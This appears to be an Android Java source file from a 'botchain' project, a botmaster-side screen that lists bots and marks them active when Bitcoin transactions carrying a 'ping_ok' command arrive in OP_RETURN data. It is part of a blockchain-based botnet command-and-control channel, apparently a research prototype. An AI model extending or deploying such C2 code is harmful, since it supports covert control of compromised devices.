package com.example.tonipagliaro.botchain;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.ListView;

import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.script.Script;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class BotListActivity extends AppCompatActivity {

    static ApplicationState appState;

    BotListAdapter listaBotAdapter;

    ArrayList<String> indirizzi=new ArrayList<String>();
    static ArrayList<String> indirizziAttivi=new ArrayList<String>();

    ListView listView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bot_list);

        appState = (ApplicationState) getApplication();

        listView = (ListView) this.findViewById(R.id.listView_bot);


        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s+"-"+appState.mappaIndirizzi.get(s));
        }

        listaBotAdapter = new BotListAdapter(this, R.layout.list_item, indirizzi);
        listView.setAdapter(listaBotAdapter);


        appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                Coin value=tx.getValueSentToMe(wallet);
                try {
                    String mess= readOpReturn(tx);

                    String[] v=mess.split("-");
                    String comando=v[0];

                    Log.d("App","comando: "+comando);

                    String addressString=v[1];

                    Log.d("App","address:"+addressString);

                    //Da modificare
                    if(comando.equalsIgnoreCase("ping_ok")) {

                        updateIndirizziAttivi(indirizziAttivi, addressString);
                        setMappaIndirizzi(indirizziAttivi);

                        for(String s : appState.mappaIndirizzi.keySet()){
                            Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
                        }

                    }


                    for(String s : indirizziAttivi)
                        Log.d("App","indirizzo attivo   "+s);

                    //listView.setAdapter(listaBotAdapter);


                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

    }


    public void updateIndirizziAttivi(ArrayList<String> indirizziAttivi,String address){
        boolean presente=false;
        if(!indirizziAttivi.isEmpty()) {
            for (String a : indirizziAttivi) {
                if (a.equalsIgnoreCase(address))
                    presente = true;
            }
        }
        if(!presente)indirizziAttivi.add(address);

    }

    public Map<String,String> setMappaIndirizzi(ArrayList<String> indirizziAttivi){
        //appState.mappaIndirizzi=new HashMap<String, String>() ;


        for(String attivi: indirizziAttivi){
            appState.mappaIndirizzi.put(attivi, "ok");
            Log.d("App", "AGGIORNO LA MAPPA CON LO STATO OK L'INDIRIZZO :" +attivi);
        }

        Log.d("App", "GRANDEZZA DELLA MAPPA : " +appState.mappaIndirizzi.size());

        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
        }

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
        return appState.mappaIndirizzi;
    }

    public Map<String,String> getMappaIndirizzi(){
        return appState.mappaIndirizzi;
    }




    public static String readOpReturn(Transaction tx) throws Exception {
        List<TransactionOutput> ti = tx.getOutputs();
        String mess="";
        Address from = null;
        for (TransactionOutput t : ti) {
            Script script = t.getScriptPubKey();

            //prelievo dell'indirizzo
            if (t.getAddressFromP2PKHScript(appState.wallet.getParams()) != null) {
                from = t.getAddressFromP2PKHScript(appState.wallet.getParams());
            }


            if (script.isOpReturn()) {
                byte[] message = new byte[script.getProgram().length-2];

                System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length - 2);

                mess = new String(message);
                Log.d("App", "Op_return   " + mess);

            }


        }
        return mess;
    }



    public ArrayList<String> getIndirizzi(){
        return indirizzi;
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


}
